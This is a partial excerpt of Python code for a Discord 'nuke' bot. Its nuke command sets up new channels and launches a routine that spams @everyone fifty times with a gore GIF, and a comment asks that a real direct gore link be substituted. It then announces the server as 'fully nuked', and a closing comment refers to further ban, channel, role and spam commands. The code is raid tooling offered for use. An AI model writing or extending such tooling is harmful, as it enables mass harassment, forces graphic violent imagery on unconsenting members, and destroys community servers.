...
GIF_URL = "https://media.tenor.com/8YkXz5fKz3gAAAAC/gore.gif"  # Replace with real direct gore GIF link

async def spam_gif_in_channel(channel, amount=50):
    message = f"@everyone EXTREME SPAM {GIF_URL} [made by Kieran]"
...
async def nuke(ctx):
    ...
    try:
        ...
        asyncio.create_task(spam_gif_in_channel(new_channel))
        await new_channel.send("✅ **SERVER FULLY NUKED + GORE GIF SPAMMING!** [made by Kieran]")
    except:
        pass
    try:
...
# ... (keep the other commands: ban, channels, roles, spam exactly as previous version)
